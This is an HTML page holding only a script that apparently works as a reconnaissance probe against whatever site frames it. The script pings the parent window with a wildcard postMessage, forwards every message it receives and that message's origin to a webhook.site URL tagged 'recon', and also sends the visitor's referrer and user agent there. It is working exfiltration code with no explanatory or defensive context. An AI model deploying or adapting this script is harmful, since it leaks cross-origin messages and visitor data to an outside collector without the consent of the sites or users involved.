<!DOCTYPE html>
<html>
<head></head>
<body>
<script>
(function() {
  var WEBHOOK = 'https://webhook.site/14690e6f-9576-4480-88c7-fd52e44cd122/recon';

  // El listener de mensajes siempre activo
  window.addEventListener('message', function(e) {
    fetch(WEBHOOK, {
      method: 'POST',
      mode: 'no-cors',
      body: JSON.stringify({
        tipo: 'message_received',
        data: JSON.stringify(e.data),
        origin: e.origin
      })
    });
  });

  // Guard solo para el ping inicial
  if (sessionStorage.getItem('fired')) return;
  sessionStorage.setItem('fired', '1');

  window.parent.postMessage('ping', '*');
  
  fetch(WEBHOOK, {
    method: 'POST',
    mode: 'no-cors',
    body: JSON.stringify({
      tipo: 'load',
      referrer: document.referrer,
      ua: navigator.userAgent,
      ts: new Date().toISOString()
    })
  });

})();
</script>
</body>
</html>
